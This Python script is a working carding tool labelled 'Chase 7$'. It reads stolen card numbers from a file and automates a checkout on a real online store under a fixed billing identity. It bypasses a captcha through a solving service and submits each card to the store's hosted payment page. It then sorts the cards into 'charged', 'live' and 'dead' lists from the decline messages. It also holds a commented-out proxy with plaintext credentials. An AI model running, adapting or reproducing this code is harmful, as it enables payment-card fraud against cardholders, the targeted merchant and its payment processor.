from zendesh import solve
import requests
import base64
import json
import re
import time
import uuid
import asyncio
import requests as zens
from datetime import datetime, timezone
import urllib3
from urllib.parse import urlparse, parse_qs, unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def zfb(t,s,e,a=False,d=None):
 r=[];i=0
 while True:
  x=t.find(s,i)
  if x==-1:break
  x+=len(s);y=t.find(e,x)
  if y==-1:break
  v=t[x:y].strip();r.append(v);i=y+len(e)
  if not a:return v
 return r if a and r else d

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

def card_type(num):
    if num.startswith('4'): return 'Visa'
    if num.startswith('5'): return 'MasterCard'
    if num.startswith('6'): return 'Discover'
    return 'UNKNOWN'

def find_between(text, before, after):
    try:
        start = text.index(before) + len(before)
        end = text.index(after, start)
        return text[start:end]
    except ValueError:
        return None

def log_status(status, message, color=WHITE):
    print(f"{BOLD}{color}[{status}]{RESET} {message}")

print(f"{CYAN}{BOLD}========================================")
print(f"      GATE : Chase 7$")
print(f"========================================{RESET}\n")

try:
    with open('cards.txt', 'r') as f:
        cards = f.read().splitlines()
except FileNotFoundError:
    log_status("ERROR", "cards.txt not found!", RED)
    exit()

for card in cards:
    try:
        num, mon, year, cvv = card.split('|')
        if len(year) == 4: year = year[2:]
        if len(mon) == 1: mon = f"0{mon}"
    except ValueError:
        log_status("SKIP", f"Invalid format: {card}", YELLOW)
        continue

    log_status(">>>", f"Processing: {card}", CYAN)
    
    s = requests.session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    })
        #s.proxies.update({
    #"http": f"http://purevpn0s13918278:6qpjgbuqfT1VaN@px043005.pointtoserver.com:10780",
    #"https": f"http://purevpn0s13918278:6qpjgbuqfT1VaN@px043005.pointtoserver.com:10780"
    #})


    try:
        ipz = s.get('https://ipinfo.io/json').json().get("ip")
        if not ipz:
            log_status("DEAD", "IP Can't be access", RED)
            continue
        rq1 = s.get("https://www.leacockcolemancenter.com/Bear-Bell---Blue/item/0757", headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'sec-ch-ua-platform': "\"iOS\"",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6"},verify=False)
        __VIEWSTATE = zfb(rq1.text, 'id="__VIEWSTATE" value="', '"')
        __EVENTVALIDATION = zfb(rq1.text,'id="__EVENTVALIDATION" value="', '"')
        __VIEWSTATEGENERATOR = zfb(rq1.text,'id="__VIEWSTATEGENERATOR" value="', '"')
        if not __VIEWSTATE or not __EVENTVALIDATION or not __VIEWSTATEGENERATOR:
            log_status("DEAD", "Falied to add it in the cart.", RED)
            continue
        s.post("https://www.leacockcolemancenter.com/Bear-Bell---Blue/item/0757", data={
  '__VIEWSTATE': __VIEWSTATE,
  '__VIEWSTATEGENERATOR': __VIEWSTATEGENERATOR,
  '__SCROLLPOSITIONX': "0",
  '__SCROLLPOSITIONY': "300.5",
  '__EVENTTARGET': "",
  '__EVENTARGUMENT': "",
  '__EVENTVALIDATION': __EVENTVALIDATION,
  'ctl00$UserNameTextBox': "",
  'ctl00$PasswordTextBox': "",
  'ctl00$Store_content$AddToCartQuantityTextBox': "1",
  'ctl00$Store_content$AddToCartButton': "Add To Cart",
  'ctl00$Store_content$LastTab': ""
}, headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'origin': "https://www.leacockcolemancenter.com",
  'referer': "https://www.leacockcolemancenter.com/Bear-Bell---Blue/item/0757",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6"},verify=False)
        rq2 = s.get("https://www.leacockcolemancenter.com/store/information", headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",'origin': "https://www.leacockcolemancenter.com",
  'referer': "https://www.leacockcolemancenter.com/store/CheckoutAccount",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6"},verify=False)
        vs = zfb(rq2.text, 'id="__VIEWSTATE" value="', '"')
        ev = zfb(rq2.text,'id="__EVENTVALIDATION" value="', '"')
        vg = zfb(rq2.text,'id="__VIEWSTATEGENERATOR" value="', '"')
        if not vs or not ev or not vg:
            log_status("DEAD", "Falied to create the order.", RED)
            continue
        s.post("https://www.leacockcolemancenter.com/store/information", data={
  '__VIEWSTATE': vs,
  '__VIEWSTATEGENERATOR': vg,
  '__SCROLLPOSITIONX': "0",
  '__SCROLLPOSITIONY': "1445.5",
  '__EVENTTARGET': "",
  '__EVENTARGUMENT': "",
  '__EVENTVALIDATION': ev,
  'ctl00$Store_content$BillingNameTextBox': "Sandesh Karder",
  'ctl00$Store_content$BillingAddress1TextBox': "House no. 12, street 201",
  'ctl00$Store_content$BillingAddress2TextBox': "",
  'ctl00$Store_content$BillingCityTextBox': "New York",
  'ctl00$Store_content$BillingStateTextBox': "NY",
  'ctl00$Store_content$BillingStateListBox': "NY",
  'ctl00$Store_content$BillingCountryListBox': "USA",
  'ctl00$Store_content$BillingZipTextBox': "10081",
  'ctl00$Store_content$PhoneTextBox': "2012132345",
  'ctl00$Store_content$EMailTextBox': "upidexter@gmail.com",
  'ctl00$Store_content$ShipToBillingAddressCheckBox': "on",
  'ctl00$Store_content$PONumberTextBox': "",
  'ctl00$Store_content$MemoBox': "",
  'ShippingOptionsList': "SE UPS Ground",
  'ctl00$Store_content$PaymentTypeRadioButtonList': "CC",
  'ctl00$Store_content$PaymentButton': "Proceed to Payment"}, headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'origin': "https://www.leacockcolemancenter.com",
  'referer': "https://www.leacockcolemancenter.com/store/information",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6",
  'priority': "u=0, i"},verify=False)
        sex1 = rq1.cookies.get("ASP.NET_SessionId")
        if not sex1:
            log_status("DEAD", "No se pudo obtener la identificación web.", RED)
            continue
        
        rq5 = s.post("https://cresecure.net/securepayments/a1/cc_collection.php", data={
  'session': sex1,
  'sess_name': "",
  'trans_type': "auth_only",
  'allowed_types': "Visa|MasterCard|Discover",
  'total_amt': "10.05",
  'order_id': "         W16615",
  'order_desc': "",
  'customer_id': "WEBSITE",
  'ip_address': ipz,
  'shipping_method': "SE UPS Ground",
  'tax': "0.00",
  'customer_company': "Sandesh Karder",
  'customer_address': "House no. 12, street",
  'customer_address2': "",
  'customer_email': "upidexter@gmail.com",
  'customer_phone': "2012132345",
  'customer_city': "New York",
  'customer_state': "NY",
  'customer_postal_code': "10081",
  'customer_country': "USA",
  'delivery_company': "Sandesh Karder",
  'delivery_address': "House no. 12, street",
  'delivery_address2': "",
  'delivery_email': "upidexter@gmail.com",
  'delivery_phone': "2012132345",
  'delivery_city': "New York",
  'delivery_state': "NY",
  'delivery_postal_code': "10081",
  'delivery_country': "USA",
  'CRESecureID': "vf863730249879",
  'currency_code': "USD",
  'lang': "en US",
  'return url': "https://www.leacockcolemancenter.com/store/confirmation",
  'cancel url': "https://www.leacockcolemancenter.com/store/information",
  'max_user_retries': "1"
}, headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'origin': "https://www.leacockcolemancenter.com",
  'referer': "https://www.leacockcolemancenter.com/",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6",
  'priority': "u=0, i"},verify=False)

        cap = asyncio.run(solve(
    k="CAP_MONSTER_KEY", #mt captcha cap moster key
    u="https://www.chasepaymentechhostedpay.com", 
    w="MTPublic-I0V7iwug2"))
        if not cap or any(x in str(cap) for x in ["None", "Failed"]):
            log_status("DEAD", "Captcha Solving Failed!", RED)
            continue

        sex2 = rq5.cookies.get("PHPSESSID")
        if not sex2:
            log_status("DEAD", "No se pudo obtener la identificación web.", RED)
            continue
        t = int(datetime.now(timezone.utc).timestamp())
        cardt = card_type(num)
        
        kuro = s.post("https://leacockcolemancenter.cresecure.net/securepayments/a1/cc_collection.php", params={'sid': sex2,'action': "process",'t': t}, data={
  'name': "Sandesh Karder",
  'card_type': cardt,
  'PAN': num,
  'cresecure_cc_expires_month': mon,
  'cresecure_cc_expires_year': year,
  'cv_data': cvv,
  'mtcaptcha-verifiedtoken': cap
}, headers={
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'origin': "https://leacockcolemancenter.cresecure.net",
  'referer': f"https://leacockcolemancenter.cresecure.net/securepayments/a1/cc_collection.php?sid={sex2}",
  'accept-language': "en-RU,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6",
  'priority': "u=0, i"},verify=False, allow_redirects=False)

        ckey = [
    "Status code 2001: Insufficient Funds (51 : DECLINED)",
    "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv",
    "Status code 2010: Card Issuer Declined CVV",
    "ERROR: ((6)) DECLINED: INCORRECT CVV  Please try again or contact us for assistance.",
    "ERROR: ((6)) DECLINED: STOLEN CARD Please try again or contact us for assistance.",
    "ERROR: ((6)) DECLINED: CVV2 MISMATCH  Please try again or contact us for assistance.",
    "ERROR: ((6)) DECLINED: DECLINED: ND: DECLINED: NSF  Please try again or contact us for assistance."]
        if "location" in kuro.headers:
            location = kuro.headers["location"]
            params = parse_qs(urlparse(location).query)
            code = unquote(params.get("code", [""])[0])
            kuromessage = unquote(params.get("message", [""])[0])
            avs_match = params.get("AVSMatch", [""])[0]
            cvv_match = params.get("CVVMatch", [""])[0]
        else:
            kuromessage = find_between(kuro.text, '<span class="error_message">', '</span>') or find_between(kuro.text, '"error_message">', '</') or "Failed to extract the value."

        if kuromessage.lower() == "success":
            log_status("CHARGED", f"{card} -> Success! - CCN | ({code}) - {kuromessage} | AVS: {avs_match} - CVV: {cvv_match}", GREEN)
            with open('hits.txt', 'a') as f: f.write(card + '\n')
        elif 'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)' in kuromessage:
            log_status("LIVE", f"{card} -> Live! - {kuromessage}", GREEN)
            with open('live.txt', 'a') as f: f.write(card + '\n')
        elif any(msg in kuromessage for msg in ckey):
            log_status("LIVE", f"{card} -> Live! - {kuromessage}", GREEN)
            with open('live.txt', 'a') as f: f.write(card + '\n')
        elif any(msg.lower() in kuromessage.lower() for msg in ckey):
            log_status("LIVE", f"{card} -> Live! - {kuromessage}", GREEN) 
            with open('live.txt', 'a') as f: f.write(card + '\n')
        elif "DECLINED" in kuromessage:
            log_status("DEAD", f"{card} -> Dead! - {kuromessage}", RED)
        else:
            log_status("UNKNOWN", f"{card} -> Unknown Kuro {kuro.text}", YELLOW)

    except Exception as e:
        log_status("ERROR", f"System Failure: {str(e)}", RED)
    
    time.sleep(1) 

print(f"\n{CYAN}{BOLD}========================================")
print(f"          CHECKING FINISHED")
print(f"========================================{RESET}")